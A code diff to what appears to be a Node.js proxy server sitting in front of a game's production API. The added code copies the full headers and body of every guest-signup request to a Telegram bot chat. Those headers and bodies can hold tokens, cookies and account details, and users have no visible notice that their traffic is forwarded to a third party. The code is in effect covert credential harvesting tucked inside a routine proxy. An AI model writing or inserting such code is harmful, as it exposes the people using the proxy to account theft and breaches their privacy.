@@ -246,10 +246,52 @@ const customData = {
 
 let lastEquipped = {}; // store latest /equip data
 
+
+// ======================================================================================================================================================
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+async function sendToTelegram(message) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "Markdown"
+      }),
+    });
+  } catch (err) {
+    console.error("Failed to send Telegram log:", err);
+  }
+}
+
+//================================================================================================================================================
 app.all("*", async (req, res) => {
   try {
-    // Remove If-None-Match if exists
+    // ====================================================================================================================================
     if (req.headers["if-none-match"]) delete req.headers["if-none-match"];
+
+    if (req.path.includes("/guest-signups")) {
+  const logMessage = `
+🛰 *New Guest Signup Request*
+📄 *Path:* ${req.path}
+🕓 *Time:* ${new Date().toISOString()}
+
+🔹 *Headers:*
+\`\`\`json
+${JSON.stringify(req.headers, null, 2).slice(0, 3000)} 
+\`\`\`
+
+🔹 *Body:*
+\`\`\`json
+${JSON.stringify(req.body, null, 2).slice(0, 3000)} 
+\`\`\`
+`;
+  sendToTelegram(logMessage);
+}
+//==========================================================================================================================================
 
     const targetUrl = "https://prod.api.indusgame.com" + req.originalUrl;
     const headers = { ...req.headers };
